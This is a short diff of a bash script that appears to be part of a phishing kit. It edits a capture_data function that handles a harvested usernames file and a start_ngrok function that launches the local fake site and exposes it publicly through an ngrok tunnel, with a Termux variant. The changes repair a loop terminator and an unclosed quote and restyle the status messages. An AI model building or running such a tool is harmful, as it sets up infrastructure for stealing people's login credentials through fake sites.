@@ -169,15 +169,15 @@ capture_data() {
 			rm -rf .server/www/usernames.txt
 		fi
 		sleep 0.75
-fi
+       done
 }
 
 ## Start ngrok
 start_ngrok() {
-	echo -e $red STARING WAIT.......http://$HOST:$PORT 
-	 sleep 1
-        setup_site
-	echo -e $red NGROK LAUNCH....."
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+
 
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 
